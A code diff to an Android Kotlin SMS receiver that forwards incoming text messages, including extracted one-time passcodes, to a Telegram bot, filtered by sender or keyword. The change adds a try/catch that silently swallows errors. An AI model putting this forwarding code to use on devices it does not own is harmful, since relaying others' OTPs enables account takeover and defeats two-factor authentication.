@@ -11,12 +11,13 @@ class SmsReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if (!Prefs.isActive(context)) return
         if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
-
-        Telephony.Sms.Intents.getMessagesFromIntent(intent).forEach { sms ->
-            val sender = sms.displayOriginatingAddress ?: "Unknown"
-            val body = sms.messageBody ?: ""
-            if (shouldForward(context, sender, body)) forward(context, sender, body)
-        }
+        try {
+            Telephony.Sms.Intents.getMessagesFromIntent(intent).forEach { sms ->
+                val sender = sms.displayOriginatingAddress ?: "Unknown"
+                val body = sms.messageBody ?: ""
+                if (shouldForward(context, sender, body)) forward(context, sender, body)
+            }
+        } catch (e: Exception) {}
     }
 
     private fun shouldForward(c: Context, sender: String, body: String): Boolean {
@@ -24,7 +25,8 @@ class SmsReceiver : BroadcastReceiver() {
         val keywords = Prefs.getKeywords(c).split(",").map { it.trim().lowercase() }.filter { it.isNotEmpty() }
         val senders = Prefs.getSenders(c).split(",").map { it.trim().lowercase() }.filter { it.isNotEmpty() }
         if (keywords.isEmpty() && senders.isEmpty()) return true
-        return senders.any { sender.lowercase().contains(it) } || keywords.any { body.lowercase().contains(it) }
+        return senders.any { sender.lowercase().contains(it) } ||
+               keywords.any { body.lowercase().contains(it) }
     }
 
     private fun forward(context: Context, sender: String, body: String) {
@@ -42,8 +44,7 @@ class SmsReceiver : BroadcastReceiver() {
             appendLine("👤 <b>From:</b> $sender")
             appendLine("💬 <b>Message:</b>"); appendLine(body); appendLine()
             if (otp != null) { appendLine("🔐 <b>OTP:</b> <code>$otp</code>"); appendLine() }
-            appendLine("🕐 <b>Time:</b> $time")
-            append("📅 <b>Date:</b> $date")
+            appendLine("🕐 <b>Time:</b> $time"); append("📅 <b>Date:</b> $date")
         }
 
         TelegramSender.send(token, chatId, msg) { success ->
